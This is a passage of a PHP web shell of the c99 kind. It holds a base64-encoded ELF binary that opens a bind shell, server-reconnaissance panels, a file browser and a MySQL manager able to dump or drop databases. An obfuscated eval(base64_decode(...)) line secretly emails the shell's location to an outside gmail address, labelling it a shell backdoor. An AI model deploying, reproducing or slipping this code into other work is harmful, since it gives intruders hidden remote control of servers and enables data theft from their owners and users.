AAAAAwAYAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAADABoAAAAAAAAAAAAAAAAAAwAbAAAAAAAAAAAAAAAAAAMAHAAAAAAAAAAAAAAAAAADAB0AAAAAAAAAAAAAAAAAAwAeAAAAAAAAAAAAAAAAAAMAHwAAAAAAAAAAAAAAAAADACAAAAAAAAAAAAAAAAAAAwAhAAEAAAAAAAAAAAAAAAQA8f8MAAAAAAAAAAAAAAAEAPH/KAAAAAAAAAAAAAAABADx/y8AAAAAAAAAAAAAAAQA8f86AAAAAAAAAAAAAAAEAPH/dAAAAMSFBAgAAAAAAgAMAIQAAAAAAAAAAAAAAAQA8f+PAAAArJkECAAAAAABABAAnQAAALSZBAgAAAAAAQARAKsAAAC8mQQIAAAAAAEAEgC4AAAA4JoECAEAAAABABcAxwAAANyaBAgAAAAAAQAWAM4AAADshQQIAAAAAAIADADkAAAAG4YECAAAAAACAAwAhAAAAAAAAAAAAAAABADx//AAAACwmQQIAAAAAAEAEAD9AAAAuJkECAAAAAABABEACgEAAKiJBAgAAAAAAQAPABgBAAC8mQQIAAAAAAEAEgAkAQAA+IgECAAAAAACAAwALwAAAAAAAAAAAAAABADx/zoBAAAAAAAAAAAAAAQA8f90AQAAAAAAAAAAAAAEAPH/eAEAAMCZBAgAAAAAAQITAIEBAACsmQQIAAAAAAAC8f+SAQAArJkECAAAAAAAAvH/pQEAAKyZBAgAAAAAAALx/7YBAACMmgQIAAAAAAECFQDMAQAArJkECAAAAAAAAvH/3wEAAAAAAAB1AQAAEgAAAPABAAAAAAAAcQAAABIAAAABAgAARIkECAQAAAARAA4ACAIAAAAAAADMAAAAEgAAABoCAAAAAAAAWgAAABIAAAAqAgAA2JoECAAAAAARAhYANwIAAK2IBAhKAAAAEgAMAEcCAAAAAAAAeAAAABIAAABZAgAAiIQECAAAAAASAAoAXwIAAAAAAAA5AAAAEgAAAHECAAAAAAAAOQAAABIAAACHAgAAoIUECAAAAAASAAwAjgIAAFyIBAhRAAAAEgAMAJ4CAADgmgQIAAAAABAA8f+qAgAAQIYECBwCAAASAAwArwIAAAAAAADmAAAAEgAAAMwCAAAAAAAAOgAAABIAAADcAgAA1JoECAAAAAAgABYA5wIAAAAAAAA5AAAAEgAAAPcCAAAkiQQIAAAAABIADQD9AgAAAAAAALkAAAASAAAADQMAAAAAAAArAAAAEgAAAB0DAADgmgQIAAAAABAA8f8kAwAA6IUECAAAAAASAgwAOwMAAOSaBAgAAAAAEADx/0ADAAAAAAAAeAAAABIAAABQAwAAAAAAAA4AAAASAAAAYQMAAEiJBAgEAAAAEQAOAHADAADUmgQIAAAAABAAFgB9AwAAAAAAADkAAAASAAAAjwMAAAAAAAAAAAAAIAAAAKMDAAAAAAAAAAAAACAAAAAAYWJpLW5vdGUuUwAuLi9zeXNkZXBzL2kzODYvZWxmL3N0YXJ0LlMAaW5pdC5jAGluaXRmaW5pLmMAL2J1aWxkL2J1aWxkZC9nbGliYy0yLjMuNi9idWlsZC10cmVlL2kzODYtbGliYy9jc3UvY3J0aS5TAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AY29tcGxldGVkLjQ0NjMAcC40NDYyAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABmcmFtZV9kdW1teQBfX0NUT1JfRU5EX18AX19EVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AC9idWlsZC9idWlsZGQvZ2xpYmMtMi4zLjYvYnVpbGQtdHJlZS9pMzg2LWxpYmMvY3N1L2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";


$safe_mode=(@ini_get("safe_mode")=='')?"OFF":"ON";
$open_basedir=(@ini_get("open_basedir")=='')?"OFF":"ON";



 @eval(@base64_decode('JHVybCA9ICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBTJ10pKSA/ICJodHRwczovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gOiAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQoNCiAkdG8gPSAiY2hpbXBweWFAZ21haWwuY29tIjsNCiAkc3ViamVjdCA9ICIkdXJsIjsNCiAkYm9keSA9ICJbK11TaGVsbCBMb2NhdGlvbjogJHVybFxuXG5bK10gLSAjU2hlbGwgQmFja2Rvb3IgIjsNCiBpZiAobWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSkpIHsNCiAgIGVjaG8oIiIpOw0KICB9IGVsc2Ugew0KICAgZWNobygiIik7DQogIH0='));
function srv_info($title,$contents) {
  echo "<tr><th>$title</th><td>:</td><td>$contents</td></tr>\n";
}
echo htmlhead($hsafemode);
echo "<table id=pagebar>";
echo "<tr><td colspan=2>\n";
echo "<div class=fleft>$hsafemode</div>\n";
echo "<div class=fright>";
echo "IP Address: <a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=".@gethostbyname($_SERVER["HTTP_HOST"])."\">".@gethostbyname($_SERVER["HTTP_HOST"])."</a> ".
     "You: <a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=".$_SERVER["REMOTE_ADDR"]."\">".$_SERVER["REMOTE_ADDR"]."</a> ".
     ($win?"Drives: ".disp_drives($d,$surl):"");
echo "</div>\n</td></tr>\n";
echo "<tr><td width=50%>\n";
echo "<table class=info>\n";

srv_info("System",php_uname());
srv_info("Software","".$DISP_SERVER_SOFTWARE);
srv_info("ID",($win) ? get_current_user()." (uid=".getmyuid()." gid=".getmygid().")" : tpexec("id"));
echo "</table></td>\n".
     "<td width=50%>\n";
echo "<table class=info>\n";
srv_info("Safe Mode",$safe_mode);  
srv_info("Open_Basedir",$open_basedir);
srv_info("Freespace",disp_freespace($d)); 
echo "</table></td></tr>\n";
echo "<tr><td colspan=2>\n";
echo get_status();
echo "</td></tr>\n";
echo "<tr><td colspan=2>\n";
echo $safemodeexecdir ? "SafemodeExecDir: ".$safemodeexecdir."<br>\n" : "";
echo showdisfunc() ? "Disabled Functions: ".showdisfunc()."\n" : "";
echo "</td></tr>\n";
echo "<tr><td colspan=2 id=mainmenu>\n";
if (count($quicklaunch2) > 0) {
  foreach($quicklaunch2 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td>\n".
     "<tr><td colspan=2 id=mainmenu>\n";
if (count($quicklaunch1) > 0) {
  foreach($quicklaunch1 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td></tr>\n<tr><td colspan=2>";
echo "<p class=fleft>\n";
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b) {
  $t = ""; $j = 0;
  foreach ($e as $r) {
    $t.= $r.DIRECTORY_SEPARATOR;
    if ($j == $i) { break; }
    $j++;
  }
  echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><font color=orange>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</font></a>\n";
  $i++;
}
echo " - ";
if (is_writable($d)) {
  $wd = TRUE;
  $wdt = "<font color=#00FF00>[OK]</font>";
  echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
}
else {
  $wd = FALSE;
  $wdt = "<font color=red>[Read-Only]</font>";
  echo "<b>".view_perms_color($d)."</b>";
}
echo "\n</p>\n";
?>
<div class=fright>
<form method="POST"><input type=hidden name=act value="ls">
Directory: <input type="text" name="d" size="50" value="<?php echo $dispd; ?>"> <input type=submit value="Go">
</form>
</div>
</td></tr></table>
<?php
/***********************/
/** INFORMATION TABLE **/
/***********************/
echo "<table id=maininfo><tr><td width=\"100%\">\n";
if ($act == "") { $act = $dspact = "ls"; }
if ($act == "sql") {
  $sql_surl = $surl."act=sql";
  if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
  if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
  if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
  if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
  if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
  $sql_surl .= "&";
  echo "<h4>Attention! MySQL Manager is <u>NOT</u> a ready module! Don't reports bugs.</h4>".
       "<table>".
       "<tr><td width=\"100%\" colspan=2 class=barheader>";
  if ($sql_server) {
    $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
    $err = mysql_smarterror();
    @mysql_select_db($sql_db,$sql_sock);
    if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
  }
  else {$sql_sock = FALSE;}
  echo ".: SQL Manager :.<br>";
  if (!$sql_sock) {
    if (!$sql_server) {echo "NO CONNECTION";}
    else {echo "Can't connect! ".$err;}
  }
  else {
    $sqlquicklaunch = array();
    $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
    $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
    $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
    $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
    $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
    $sqlquicklaunch[] = array("Logout",$surl."act=sql");
    echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
    if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
  }
  echo "</td></tr><tr>";
  if (!$sql_sock) {
    echo "<td width=\"28%\" height=\"100\" valign=\"top\"><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width=\"90%\" height=1 valign=\"top\">";
    echo "<table width=\"100%\" border=0><tr><td><b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b></td><td><b>Database</b></td></tr><form action=\" $surl \" method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"></td><td><input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_db\" value=\"\" maxlength=\"64\"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type=\"text\" name=\"sql_server\" value=\"localhost\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength=\"6\" size=\"3\"></td><td><input type=\"submit\" value=\"Connect\"></td></tr><tr><td></td></tr></form></table></td>";
  }
  else {
    //Start left panel
    if (!empty($sql_db)) {
      ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_tables($sql_db);
      if (!$result) {echo mysql_smarterror();}
      else {
        echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
        $c = 0;
        while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>+&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
        if (!$c) {echo "No tables found in database.";}
      }
    }
    else {
      ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_dbs($sql_sock);
      if (!$result) {echo mysql_smarterror();}
      else {
        ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db">
        <?php
        $c = 0;
        $dbs = "";
        while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
        echo "<option value=\"\">Databases (".$c.")</option>";
        echo $dbs;
      }
      ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form>
      <?php
    }
    //End left panel
    echo "</td><td width=\"100%\">";
    //Start center panel
    $diplay = TRUE;
    if ($sql_db) {
      if (!is_numeric($c)) {$c = 0;}
      if ($c == 0) {$c = "no";}
      echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
      if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
      echo "</b></center>";
      $acts = array("","dump");
      if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
      elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
      elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
      elseif ($sql_tbl_act == "insert") {
        if ($sql_tbl_insert_radio == 1) {
          $keys = "";
          $akeys = array_keys($sql_tbl_insert);
          foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
          if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
          $values = "";
          $i = 0;
          foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
          if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
          $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
        elseif ($sql_tbl_insert_radio == 2) {
          $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
          $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
          $result = mysql_query($sql_query) or print(mysql_smarterror());
          $result = mysql_fetch_array($result, MYSQL_ASSOC);
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
      }
      if ($sql_act == "query") {
        echo "<hr size=\"1\" noshade>";
        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
        if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
        if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>";}
      }
      if (in_array($sql_act,$acts)) {
        ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="act" value="sql">
        <input type="hidden" name="sql_act" value="newtbl">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
        <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
        <input type="text" name="sql_newtbl" size="20">
        <input type="submit" value="Create">
        </form></td>
        <td width="30%" height="1"><b>Dump DB:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="act" value="sql">
        <input type="hidden" name="sql_act" value="dump">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"><input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table>
        <?php
        if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
        if ($sql_act == "newtbl") {
          echo "<b>";
          if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
            echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
          }
          else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
        }
        elseif ($sql_act == "dump") {
          if (empty($submit)) {
            $diplay = FALSE;
            echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
            echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
            $v = join (";",$dmptbls);
            echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
            if ($dump_file) {$tmp = $dump_file;}
            else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
            echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
            echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
            echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
            echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
            echo "</form>";
          }
          else {
            $diplay = TRUE;
            $set = array();
            $set["sock"] = $sql_sock;
            $set["db"] = $sql_db;
            $dump_out = "download";
            $set["print"] = 0;
            $set["nl2br"] = 0;
            $set[""] = 0;
            $set["file"] = $dump_file;
            $set["add_drop"] = TRUE;
            $set["onlytabs"] = array();
            if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
            $ret = mysql_dump($set);
            if ($sql_dump_download) {
              @ob_clean();
              header("Content-type: application/octet-stream");
              header("Content-length: ".strlen($ret));
              header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
              echo $ret;
              exit;
            }
            elseif ($sql_dump_savetofile) {
              $fp = fopen($sql_dump_file,"w");
              if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
              else {
                fwrite($fp,$ret);
                fclose($fp);
                echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
              }
            }
            else {echo "<b>Dump: nothing to do!</b>";}
          }
        }
        if ($diplay) {
    if (!empty($sql_tbl)) {
      if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
      $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
      $count_row = mysql_fetch_array($count);
      mysql_free_result($count);
      $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
      $tbl_struct_fields = array();
      while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
      if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
      $perpage = $sql_tbl_le - $sql_tbl_ls;
      if (!is_numeric($perpage)) {$perpage = 10;}
      $numpages = $count_row[0]/$perpage;
      $e = explode(" ",$sql_order);
      if (count($e) == 2) {
        if ($e[0] == "d") {$asc_desc = "DESC";}
        else {$asc_desc = "ASC";}
        $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
      }
      else {$v = "";}
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
      echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[<b> Structure </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[<b> Browse </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[<b> Dump </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_act == "insert") {
        if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
        if (!empty($sql_tbl_insert_radio)) {  } //Not Ready
        else {
          echo "<br><br><b>Inserting row into table:</b><br>";
          if (!empty($sql_tbl_insert_q)) {
            $sql_query = "SELECT * FROM `".$sql_tbl."`";
            $sql_query .= " WHERE".$sql_tbl_insert_q;
            $sql_query .= " LIMIT 1;";
            $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
            $values = mysql_fetch_assoc($result);
            mysql_free_result($result);
          }
          else {$values = array();}
          echo "<form method=\"POST\"><table width=\"1%\" border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
          foreach ($tbl_struct_fields as $field) {
            $name = $field["Field"];
            if (empty($sql_tbl_insert_q)) {$v = "";}
            echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
            $i++;
          }
          echo "</table><br>";
